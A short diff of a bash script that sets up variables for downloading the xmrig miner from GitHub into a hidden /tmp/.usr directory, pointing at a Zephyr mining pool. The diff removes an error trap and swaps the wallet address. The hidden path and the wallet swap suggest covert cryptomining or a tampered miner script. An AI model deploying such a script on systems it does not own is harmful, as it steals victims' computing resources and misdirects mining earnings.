@@ -1,17 +1,11 @@
 #!/bin/bash
 
 
-handle_error() {
-    echo "发生错误：$1"
-    exit 1
-}
-
-trap 'handle_error $LINENO' ERR
 
 HOST="zeph.kryptex.network"
 
 ROOT_path="/tmp/.usr"
-wallet="ZEPHs6nHn1AJsdkqaZdUioNb7DnFNmcbXGuarcPSGGis7HBV7ZmeewCbUAVDwpGsiWGDyzUCVrcPLCMe6Sjd4V48Xu4FoLvTYRr"
+wallet="ZEPHsB2UzncgyQKTxFLXfK3WotFaaXGtrD9iJmtDenhvWMfNqwFKMEmhcakE5NDFGjJUDMMBTF5aLQHYKvJcL5k57gMKxfQ9gmB"
 xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
 random_number=$(shuf -i 10000000-99999999 -n 1)
 command=""
